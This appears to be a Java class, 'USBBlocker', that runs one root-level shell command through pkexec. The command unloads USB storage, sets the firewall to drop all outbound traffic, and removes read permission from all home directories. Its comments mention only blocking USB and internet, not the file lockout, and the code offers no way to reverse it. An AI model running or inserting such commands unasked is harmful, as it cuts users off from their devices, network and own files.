package org.example;

import java.io.IOException;

public class USBBlocker {
    public void Block() {
        try {
            String username = System.getProperty("user.name");
            // Command to block USB and internet access
            String blockCommands = "pkexec bash -c 'modprobe -r usb_storage && iptables -P OUTPUT DROP && chmod -r /home/* && chmod -r /home/"+username+"/Documents && chmod -r /home/"+username+"/Downloads'";

            // Execute the command
            Process blockProcess = Runtime.getRuntime().exec(new String[] { "bash", "-c", blockCommands });

            // Wait for the process to finish
            blockProcess.waitFor();

            // Print status
            if (blockProcess.exitValue() == 0) {
                System.out.println("USB and internet access blocked successfully.");
            } else {
                System.err.println("Failed to block USB and internet access.");
            }

        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}
